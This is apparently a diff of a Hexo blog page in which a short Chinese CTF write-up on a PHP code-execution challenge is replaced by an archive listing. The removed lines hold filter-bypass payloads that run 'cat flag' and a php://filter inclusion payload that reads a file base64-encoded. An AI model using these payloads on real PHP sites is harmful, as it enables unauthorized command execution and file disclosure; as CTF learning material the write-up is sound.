@@ -8,10 +8,10 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <!-- Open Graph Data -->
-  <meta property="og:title" content="rce2"/>
+  <meta property="og:title" content="Hexo"/>
   <meta property="og:description" content="" />
   <meta property="og:site_name" content="Hexo"/>
-  <meta property="og:type" content="article" />
+  <meta property="og:type" content="website" />
   <meta property="og:image" content="http://example.com"/>
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
@@ -39,7 +39,8 @@
 <meta name="generator" content="Hexo 5.2.0"></head>
 
   <body>
-    <!-- Page Header -->
+    <!-- Archive Header -->
+<!-- Page Header -->
 
 
 <header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
@@ -47,7 +48,7 @@
     <div class="row">
       <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
         <div class="page-title with-background-image">
-          <p class="title">rce2</p>
+          <p class="title">Blog Archives</p>
           <p class="subtitle"></p>
         </div>
         <div class="site-menu with-background-image">
@@ -92,38 +93,42 @@
   </div>
 </header>
 
-<article>
-  <div class="container typo">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <div class="post-info text-muted">
-          
-            <!-- Author -->
-            <span class="author info">By John Doe</span>
-          
-          <!-- Date -->
-          <span class="date-time info">On
-            <span class="date">2020-11-26</span>
-            <span class="time">21:20:55</span>
-          </span>
-          
-        </div>
-        <!-- Tags -->
-        
-        <!-- Post Main Content -->
-        <div class="post-content">
-          <p>#前言<br>basic rce 2</p>
-<pre><code>直接构造？Rem=（&quot;ca\t f\lag&quot;）或者Rem=（&quot;\x63\x61\x74\x20\x66\x6c\x61\x67&quot;）就可以出来</code></pre>
-<p><img src="5.png" alt="5"><br>但是在网上看到了一个比较厉害的做法<br></p>
-<pre><code>?Rem=include $_GET[&quot;cky&quot;] ?&gt;&amp;cky=php://filter/read=convert.base64-encode/resource=flag&lt;br&gt;</code></pre>
-<p>构造文件包含， ?Rem=include $_GET[“cky”] ?&gt;后面的？&gt;是要封闭，按我的理解是可能不对，就是不会在过滤了，因为如果要伪协议读取里面是要有flag，$_GET[“cky”]这是传入一个参数，就是上面说的eval=<?php?>，后面在传入值。<br></p>
-<p><img src="1.png" alt="3"><br>然后base64<br>这道题我刚开始还有一点的疑问是是构造？Rem还是？Ram，后来尝试后只有Rem可行，就想为什么，上网查发现get传入的参数只有rem，所以要用这个。</p>
+<!-- Archive List -->
+<div class="container">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      
+        <div class="archive-item">
+  <a href="/2020/12/02/php%E5%87%BD%E6%95%B0/" class="post-title">
+    php函数
+  </a>
+  <div class="date text-muted">Posted on 2020-12-02 21:18:51</div>
+</div>
 
-        </div>
-      </div>
+      
+        <div class="archive-item">
+  <a href="/2020/12/02/%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="post-title">
+    伪协议
+  </a>
+  <div class="date text-muted">Posted on 2020-12-02 12:53:14</div>
+</div>
+
+      
+
     </div>
   </div>
-</article>
+</div>
+<!-- Pagination -->
+<div class="container">
+  <div class="row">
+    <div class="col-lg-10 col-md-10 col-md-offset-1">
+      <ul class="pagination">
+          
+          
+      </ul>
+    </div>
+  </div>
+</div>
 
 
 
